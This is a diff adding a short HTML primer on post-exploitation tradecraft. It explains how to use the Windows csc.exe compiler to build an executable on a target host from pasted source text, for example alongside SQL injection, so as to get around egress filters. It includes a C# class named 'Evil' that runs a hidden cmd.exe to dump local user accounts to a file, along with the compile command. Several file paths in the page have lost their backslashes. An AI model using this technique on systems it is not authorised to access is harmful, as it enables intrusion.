@@ -1,0 +1,17 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>General Primer</title>
+</head><body>C sharp compiler (csc) is the command line compiler included with Microsoft .NET installations within Windows. This could be useful if you are unable to copy over an executable file, but can still copy over text. Using this method, combined with SQL injection, can move an exe to a box without having to try to bypass egress filters or authenticated proxies that might block outbound connectivity.<br/>
+<br/>
+The default location for this executable is the following:<br/>
+C:WindowsMicrosoft.NETFrameworkversion<br/>
+<br/>
+Using the following example code, the compiled executable will use cmd.exe to query the local users on the box and write the results to a file in the C:Temp directory. This could obviously be modified to interact with different exe’s on the box, or completely re-written to use your own exploit code.<br/>
+<br/>
+public class Evil { &nbsp; &nbsp;public static void Main() &nbsp; &nbsp;{ &nbsp; &nbsp; &nbsp; System.Diagnostics.Process process = new System.Diagnostics.Process(); &#09; &nbsp;System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo(); &#09; &nbsp;startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden; &#09; &nbsp;startInfo.FileName = "cmd.exe"; &#09; &nbsp;startInfo.Arguments = "/C net users &gt; C:\Temp\users.txt"; &#09; &nbsp;process.StartInfo = startInfo; &#09; &nbsp;process.Start(); &nbsp; &nbsp;} }<br/>
+<br/>
+<br/>
+To compile your source code, type:<br/>
+csc.exe /out:C:evilevil.exe C:evilevil.cs</body></html>
